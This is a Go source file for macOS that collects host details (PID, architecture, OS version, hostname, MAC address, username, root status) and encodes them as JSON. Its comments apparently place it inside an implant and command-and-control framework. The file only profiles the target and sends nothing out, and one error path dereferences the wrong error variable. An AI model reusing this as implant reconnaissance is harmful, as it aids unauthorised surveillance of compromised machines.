// +build darwin

package sysinfo_native_darwin

import (
	
	"os"
	"os/user"
	"bytes"
	"encoding/json"
	"strconv"
	"net"
	"strings"
    "unsafe"
    "runtime"
)

/*
#cgo CFLAGS: -x objective-c
#cgo LDFLAGS: -framework Foundation
#import <Foundation/Foundation.h>
#import <mach-o/arch.h>
#include <stdlib.h>

int arch(char * res){
    int n;
    NXArchInfo *info = NXGetLocalArchInfo();
    NSString *typeOfCpu = [NSString stringWithUTF8String:info->description];
    char *archch = strdup([typeOfCpu UTF8String]);
    n = sprintf(res,"%s",archch);
    return n;
}

int osv(char * res) {
    int n;
    NSProcessInfo *pInfo = [NSProcessInfo processInfo];
    NSString *version = [pInfo operatingSystemVersionString];
    char *versionch = strdup([version UTF8String]);
    n = sprintf(res,"%s",versionch);
    return n;
}
*/
import "C"

/*
This JSON Object definition is needed in some Implants Modules to decode parameters
Hive will have the same definitions in: ./src/hive/hiveJobs.go
*/
type SysInfo struct {
    Pid string  `json:"pid"`
    Arch string  `json:"arch"`
    Os string  `json:"os"`
    OsV string  `json:"osv"`
    Hostname string   `json:"hostname"` 
    Mac string  `json:"mac"`
    User        string   `json:"user"`   
    Privileges string   `json:"privileges"`

}


func SysinfoNativeDarwin() (bool,string){

	var(
		pid,oss,osv,arch,hostname,mac,actualUser,privileges string
		err error
	)

	
	//Pid
	pid = strconv.Itoa(os.Getpid())


	//OS Distro,version,arch
    oss = "darwin"

    arch = "Compiled for "+runtime.GOARCH+": "
    ptrArch := C.malloc(C.sizeof_char * 1024)
    defer C.free(unsafe.Pointer(ptrArch))
    sizeArch := C.arch((*C.char)(ptrArch))
    bArch := C.GoBytes(ptrArch, sizeArch)
    arch = arch + string(bArch)


    ptrOsv := C.malloc(C.sizeof_char * 1024)
    defer C.free(unsafe.Pointer(ptrOsv))
    sizeOsv := C.osv((*C.char)(ptrOsv))
    bOsv := C.GoBytes(ptrOsv, sizeOsv)
    osv = string(bOsv)


    //Hostname
	hostname,err = os.Hostname()
	if err != nil {
		return true,"Error Getting Hostname:"+err.Error()
	}


	//Mac
    addrs, erri := net.InterfaceAddrs()

    if erri != nil {
            return true,"Error Getting Mac:"+erri.Error()
    }

    var currentIP, currentNetworkHardwareName string

    for _, address := range addrs {

        // check the address type and if it is not a loopback the display it
        // = GET LOCAL IP ADDRESS
        if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
            if ipnet.IP.To4() != nil {
                currentIP = ipnet.IP.String()
            }
        }
    }

    interfaces, _ := net.Interfaces()
    for _, interf := range interfaces {
        if addrs, err := interf.Addrs(); err == nil {
            for _, addr := range addrs {
                // only interested in the name with current IP address
                if strings.Contains(addr.String(), currentIP) {
                    currentNetworkHardwareName = interf.Name
                }
            }
        }
    }
    
    netInterface, errm := net.InterfaceByName(currentNetworkHardwareName)
    if errm != nil {
        return true,"Error Getting Mac:"+errm.Error()
    }

    mac = netInterface.HardwareAddr.String()

    //User
    actualUserO,errU := user.Current()

    if errU != nil {
        return true,"Error Getting User:"+err.Error()
    }
    actualUser = actualUserO.Username

	//privileges
	if actualUser == "root" {
		privileges = "root"
	}else{
		privileges = "No root"
	}

	sysinfo := SysInfo{pid,arch,oss,osv,hostname,mac,actualUser,privileges}
	bufRP := new(bytes.Buffer)
	json.NewEncoder(bufRP).Encode(sysinfo)
	resultRP := bufRP.String()
	return false,resultRP
}